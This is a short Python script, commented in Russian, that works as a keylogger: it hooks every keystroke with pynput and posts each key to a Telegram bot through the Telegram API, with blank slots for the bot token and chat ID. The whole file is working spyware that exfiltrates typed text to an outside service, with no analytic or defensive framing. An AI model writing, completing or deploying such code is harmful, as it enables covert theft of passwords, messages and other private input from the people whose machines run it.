import requests
from pynput import keyboard
from datetime import datetime

# Твой токен бота
TOKEN = ""

# Твой chat_id (можешь узнать через @userinfobot)
CHAT_ID = ""

# Отправка текстового сообщения
def send_message(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    response = requests.post(url, data=data)
    return response.json()

def on_press(key):
    try:
        send_message(f"{key.char} ")
    except AttributeError:
        send_message(f"{key} ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

